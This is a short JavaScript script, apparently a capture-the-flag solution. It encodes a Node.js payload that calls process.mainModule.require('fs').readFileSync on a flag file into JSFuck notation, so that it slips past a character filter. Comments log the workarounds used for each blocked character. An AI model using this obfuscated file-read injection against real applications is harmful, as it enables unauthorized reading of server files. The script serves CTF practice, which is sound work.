// const payload = `process.mainModule.require('fs').readFileSync('/flag')`;
// first step: replace digits with casting booleans, replace optimization with just additions
// second step: go through letters needed and see if they work, fix i
// fix . => use String.fromCharCode(...), C was not working, => p not working
// use () instead of [] for wrapping if in () instead of []
// h not working => wrap h
// M not working - use String.fromCharCode
// q,),] not working - ^ and change index
const payload = 'process.mainModule.require("fs").readFileSync("flag.txt")';
const { JSFuck } = require('./jsfck.js');
const fudg = JSFuck.encode(payload, true, true);
console.log(fudg);
// [].__proto__.toString = () => '^w^';
// console.log(eval(fudg).toString());
